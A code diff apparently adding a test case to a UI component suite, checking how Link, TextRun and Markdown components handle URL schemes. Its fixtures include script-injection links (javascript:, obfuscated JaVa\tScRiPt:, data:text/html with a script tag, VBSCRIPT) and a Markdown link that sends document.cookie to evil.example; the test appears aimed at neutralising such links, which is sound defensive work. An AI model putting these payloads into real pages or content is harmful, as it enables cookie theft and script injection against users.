@@ -103,6 +103,7 @@ import { ProgressBar } from './components/ProgressBar';
 import { Select } from './components/Select';
 import { Switch } from './components/Switch';
 import { Calendar } from './components/Calendar';
+import { Markdown } from './components/Markdown';
 import { dateOnly } from '../utils/datetime';
 import { installCulture } from '../utils/culture';
 import { calendarFormat } from './__fixtures__/calendar-format';
@@ -476,6 +477,27 @@ function cases(): Record<string, { node: unknown; presses: number[] }> {
     ),
     // Driven: index 2 is the first day CELL (the two chevrons come first in tree order).
     'calendar-picks-a-day': { node: new Calendar(dateOnly(2026, 7, 17)), presses: [2] },
+    'links-with-schemes': still(
+      column(
+        8,
+        new Link('javascript:alert(1)', new Text('script', 'bodyM', photonTheme.textPrimary)),
+        new Link(' JaVa\tScRiPt:alert(1)', new Text('folded', 'bodyM', photonTheme.textPrimary)),
+        new Link('mailto:team@example.com', new Text('mail', 'bodyM', photonTheme.textPrimary)),
+        new Text('', 'bodyM', photonTheme.textPrimary, 0, {
+          spans: [
+            new TextRun('data', null, false, { destination: 'data:text/html,<script>alert(1)</script>' }),
+            new TextRun('vb', null, false, { destination: 'VBSCRIPT:msgbox' }),
+            new TextRun('call', null, false, { destination: 'tel:+351210000000' }),
+            new TextRun('web', null, false, { destination: 'HTTPS://example.com' }),
+            new TextRun('here', null, false, { destination: '#top' }),
+            new TextRun('next', null, false, { destination: 'docs/next?page=2' }),
+          ],
+        }),
+        new Markdown(
+          "[click](javascript:location='//evil.example/?'+document.cookie) and [docs](https://example.com/docs)",
+        ),
+      ),
+    ),
     'links-in-portuguese': still(
       column(
         8,
